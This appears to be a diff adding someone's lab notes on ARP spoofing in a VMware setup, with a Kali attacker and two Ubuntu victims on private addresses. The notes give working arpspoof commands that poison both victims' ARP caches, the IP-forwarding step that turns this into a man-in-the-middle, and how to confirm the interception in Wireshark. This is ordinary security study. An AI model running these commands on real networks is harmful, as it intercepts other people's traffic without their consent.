@@ -1,0 +1,38 @@
+ARP SPOOFING - notes
+
+ip a -> to all machines
+    will showcase ip addresses and the mac address is right above
+
+ip neigh -> to victims (after pinging)
+    will showcase the ARP cache of known machines - machines that have
+    communicated with each other
+    (this is the ARP cache, not the switch's MAC table)
+
+192.168.238.2 -> inside ip neigh is the default NAT gateway inside VMware
+
+
+machines:
+    Kali    (attacker)  .130   00:0c:29:a1:0f:74   eth0
+    ubuntua (victim)    .128   00:0c:29:6a:61:49   ens33
+    ubuntub (victim)    .129   00:0c:29:55:90:f5   ens33
+
+
+attack -> on Kali, 2 terminals, both left running:
+    sudo arpspoof -i eth0 -t 192.168.238.128 192.168.238.129
+    sudo arpspoof -i eth0 -t 192.168.238.129 192.168.238.128
+    (-t = target to poison, then the host to impersonate)
+    takes IPs but what it changes is the IP->MAC in the victim's ARP cache
+
+
+ip forwarding -> on Kali, so victims still talk (MITM, not DoS):
+    sudo sysctl -w net.ipv4.ip_forward=1
+    cat /proc/sys/net/ipv4/ip_forward   -> should say 1
+
+
+proof:
+    ip neigh on a victim -> the other victim now points to Kali's MAC
+    wireshark (arp)  -> flood of "is-at 00:0c:29:a1:0f:74" + duplicate use
+    wireshark (icmp) -> victim ping seen on Kali, TTL drops 64 -> 63
+
+
+cleanup -> Ctrl+C on both arpspoof terminals (it re-arps the victims back)
